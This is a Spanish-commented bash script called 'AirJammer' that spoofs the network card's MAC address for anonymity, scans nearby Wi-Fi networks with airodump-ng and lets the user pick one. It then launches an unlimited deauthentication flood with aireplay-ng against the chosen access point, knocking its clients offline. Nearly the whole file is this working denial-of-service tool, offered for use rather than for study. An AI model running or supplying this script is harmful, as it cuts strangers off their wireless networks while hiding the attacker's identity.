#!/bin/bash
# CIRIDAE 

#Mis mierdas para que quede guay
echo "--------------------------------------------"
echo "|/Script AirJammer by Ciridae/             |"
echo "--------------------------------------------"
sleep 0.3s
tput cuu1; tput el
tput cuu1; tput el
tput cuu1; tput el
echo "--------------------------------------------"
echo "|  \Script AirJammer by Ciridae\           |"
echo "--------------------------------------------"
sleep 0.3s
tput cuu1; tput el
tput cuu1; tput el
tput cuu1; tput el
echo "--------------------------------------------"
echo "|    /Script AirJammer by Ciridae/         |"
echo "--------------------------------------------"
sleep 0.3s
tput cuu1; tput el
tput cuu1; tput el
tput cuu1; tput el
echo "--------------------------------------------"
echo "|      \Script AirJammer by Ciridae\       |"
echo "--------------------------------------------"
sleep 0.3s
tput cuu1; tput el
tput cuu1; tput el
tput cuu1; tput el
echo "--------------------------------------------"
echo "|         /Script AirJammer by Ciridae/    |"
echo "--------------------------------------------"
sleep 0.3s
tput cuu1; tput el
tput cuu1; tput el
tput cuu1; tput el
echo "--------------------------------------------"
echo "|      Script AirJammer by Ciridae         |"
echo "--------------------------------------------"


#Comprobamos que este instalado airmon-ng
airmon-ng > /dev/null 2>/dev/null 
if [ $? != 0 ] ; then
	echo "No tienes airmon-ng instalado o no estas ejecutando el script en modo root, saliendo"
	exit 1
fi

#Comprobamos que esté instalado macchanger
# macchanger > /dev/null 2>/dev/null 
# if [ $? != 0 ] ; then
# 	echo "No tienes macchanger instalado,tu anonimato podria verse comprometido"
# 	echo "Deseas continuar con tu MAC original?[Y/n]"
# 	read aux
# 	if [ $aux == "n" ] ; then
# 		exit 2
# 	fi
# fi


#Listar interfaces y elegir la nuestra
echo "Introduce el numero de una interfaz de red de las listadas para realizar el ataque con ella: "
interfaces=()
cont=0
for iface in $(ifconfig | cut -d ' ' -f1| tr ':' '\n' | awk NF)
do
        echo "$cont) $iface"
        interfaces+=("$iface")
        (( ++cont ))
done

#La variable select contiene el indice de la interfaz seleccionada por el usuario en el array
read select
echo "Seleccionada la interfaz ${interfaces[$select]}"


#Cambiaremos la mac por seguridad gg
sudo ifconfig ${interfaces[$select]} down
echo "Cambiando la mac "
echo "." ;  sleep 0.2s
tput cuu1; tput el
echo ".."; sleep 0.2s
tput cuu1; tput el
echo "..."; sleep 0.2s
#generando mac semialealeatoria (Japan Radio Company por que suena vaporwave)y seteandola
hexchars="0123456789ABCDEF"
end=$( for i in {1..6} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/:\1/g' )
mac=00:00:27$end
echo "$mac"
sudo ifconfig ${interfaces[$select]} hw ether $mac

#Ponemos la tarjeta en modo monitor 
#Revisar fallo SIOCSIFHWADDR: Argumento inválido

echo "Matando los pocesos que puedan interferir con el ataque"
sleep 1.5s
sudo airmon-ng check kill

#Listando las redes en alcance
#sudo airodump-ng ${interfaces[$select]}
rm output_red-01.csv
sudo airodump-ng -w output_red --output-format csv ${interfaces[$select]}
#genera un archivo con las columnas BSSID,channel, intensidad y ESSID
awk -F "\"*,\"*" '{print $1,$4,$9,$14}' output_red-01.csv > res.txt

#Guardo en una var la cantidad de redes encontradas
num="${#essids[@]}"
#creo un array numerado con esa cantidad
secuencia=($(seq 0 1 $num))


# PARTE DE PRINTEAR NUMERADAS LAS REDES -- REVISAR TODO- -- MUERTE Y DESTRUCCION
#recorrer el CSV por lineas
file="output_red-01.csv"
sed -i '1d' $file
sed -i '/Station /,/^\s*$/{d}' $file

#eliminar columnas innecesarias y eliminando output
cut -d, -f2,3,5,6,7,8,10,11,12,13,15 --complement output_red-01.csv > res
rm $file
file="res"
cont=0
secuencia=()

while read a b c d; do 
   bssids+=($a)
   channel+=($b)
   power+=($c)
   essids+=($d)
   secuencia+=("$cont")
   (( ++cont ))
done < <(sed 's/,/\t/g' res)


#essids=(); bssids=(); channels=(); power=() son los arrays con datos
# bssids=( $(cut -d ' ' -f1 $file) ) #empieza titulo en 0
# channel=( $(cut -d ' ' -f2 $file) ) #en 0
# power=( $(cut -d ' ' -f4 $file) ) #en 0
# essids=( $(cut -d ' ' -f7 $file) ) #en 0

#eligiendo red para atacar por el user
clear
cat res | sed 's/\t/,|,/g' | column -s ',' -t > final.txt
rm res 
nl -nrn final.txt -v 0
rm final.txt 
echo "Introduce el numero de la red a atacar: "
read obj

#comprobación red seleccionada
# while  $obj < 0  ;do
# 	echo ""
# 	echo "Introduce un numero de red valido"
# 	read obj
# done
rm res.txt
iwconfig ${interfaces[$select]} channel ${channel[$obj]}
aireplay-ng -0 0 -a ${bssids[$obj]} ${interfaces[$select]}




#LIMPIAR AL SALIR!
#Comprobar si funciona en todas las distros
echo "Reestableciendo la conexión wifi"

sudo ifconfig ${interfaces[$select]} down
sudo iwconfig ${interfaces[$select]} mode managed
sudo ifconfig ${interfaces[$select]} up

sudo systemctl start NetworkManager
